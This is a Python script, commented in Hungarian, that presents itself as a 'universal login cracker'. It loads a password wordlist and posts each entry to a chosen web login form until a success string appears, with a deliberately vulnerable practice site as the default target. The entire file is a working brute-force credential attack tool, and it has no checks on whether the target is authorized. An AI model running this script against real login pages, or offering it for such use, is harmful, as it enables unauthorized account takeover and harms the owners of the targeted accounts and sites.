import requests
import sys
import os

# Színek
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def load_passwords(filename):
    """Beolvassa a jelszavakat egy külső fájlból."""
    try:
        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
            # A strip() levágja a sorvégi entereket
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"{RED}[!] HIBA: A '{filename}' fájl nem található!{RESET}")
        sys.exit()

def brute_force(target_url, username, user_field, pass_field, password_list, success_msg):
    print(f"\n{CYAN}--- 🔨 BRUTE FORCE ATTACK INDÍTÁSA ---{RESET}")
    print(f"[*] Célpont: {target_url}")
    print(f"[*] Felhasználó: {username}")
    print(f"[*] Betöltött jelszavak száma: {len(password_list)}")
    print("---------------------------------------")

    for password in password_list:
        # Dinamikusan állítjuk össze az adatcsomagot a megadott mezőnevekkel
        data = {
            user_field: username,
            pass_field: password,
            "login": "submit" # Sok oldalon kell egy gomb lenyomás is, ez gyakori név
        }

        print(f"[*] Próbálkozás: {password:<20}", end="\r") # \r miatt egy sorban pörög

        try:
            # POST kérés küldése
            response = requests.post(target_url, data=data, timeout=5)
            
            # Elemzés: Ha a "Siker üzenet" (amit a felhasználó megadott) benne van az oldalon
            # VAGY ha a válasz URL-je megváltozott (átirányítás történt a profilra)
            if success_msg in response.text:
                print(f"\n{GREEN}[+] SIKER! 🔓 Jelszó feltörve: {password}{RESET}")
                return
            
        except requests.exceptions.RequestException:
            # Ha hálózati hiba van, nem állunk meg, megyünk tovább
            continue

    print(f"\n{RED}[!] A támadás véget ért. A jelszó nincs a listában.{RESET}")

if __name__ == "__main__":
    print(f"{YELLOW}--- UNIVERSAL LOGIN CRACKER (v2.0) ---{RESET}")
    
    # 1. Adatbekérés a felhasználótól
    target_url = input("Add meg a Login URL-t (pl. http://testphp.vulnweb.com/userinfo.php): ").strip()
    if not target_url: target_url = "http://testphp.vulnweb.com/userinfo.php" # Alapértelmezett
    
    username = input("Célpont felhasználóneve (pl. test): ").strip()
    
    # Itt jön a verzitilitás! Meg kell adni, hogy hívják a mezőket a HTML-ben.
    # (Ezt a böngészőben F12 -> Inspect Element-tel lehet megnézni)
    print(f"\n{CYAN}[i] Tipp: Jobb klikk a mezőn -> Vizsgálat (Inspect) -> 'name' attribútum{RESET}")
    user_field = input("Felhasználónév mező neve (HTML name) [alapértelmezett: uname]: ").strip() or "uname"
    pass_field = input("Jelszó mező neve (HTML name) [alapértelmezett: pass]: ").strip() or "pass"
    
    # Mi jelzi a sikert? Pl. "Logout", "Welcome", "Dashboard"
    success_msg = input("Sikeres belépést jelző szöveg [alapértelmezett: Logout]: ").strip() or "Logout"

    # 2. Jelszólista fájl bekérése
    wordlist_file = input("Jelszólista fájl neve [alapértelmezett: passwords.txt]: ").strip() or "passwords.txt"
    
    # 3. Indítás
    passwords = load_passwords(wordlist_file)
    brute_force(target_url, username, user_field, pass_field, passwords, success_msg)